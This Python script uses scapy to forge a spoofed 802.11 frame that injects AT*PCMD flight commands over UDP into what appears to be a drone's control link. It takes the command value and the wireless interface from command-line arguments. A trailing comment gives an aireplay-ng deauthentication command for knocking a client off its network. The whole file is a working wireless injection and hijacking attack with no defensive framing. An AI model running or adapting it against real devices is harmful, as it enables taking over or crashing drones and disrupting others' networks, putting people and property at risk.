#!/usr/bin/env python

from scapy.all import *
import sys

dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
payload = Raw(load='AT*PCMD='+str(sys.argv[1])+', 1, 0, -2, 0, 0\r')

#AT*PCMD_MAG=5736,0,0,0,0,0,0,0\r


#AT*REF=10000,290717696\rAT*REF=10001,290718208\rAT*REF=10000,290717696\r

pkt = RadioTap()/dot11h/ipudph/payload
	
sendp(pkt,iface=sys.argv[2],count=1,verbose=0)



#Deauth : 

#aireplay-ng -0 1 -a BSSID -c client mon0
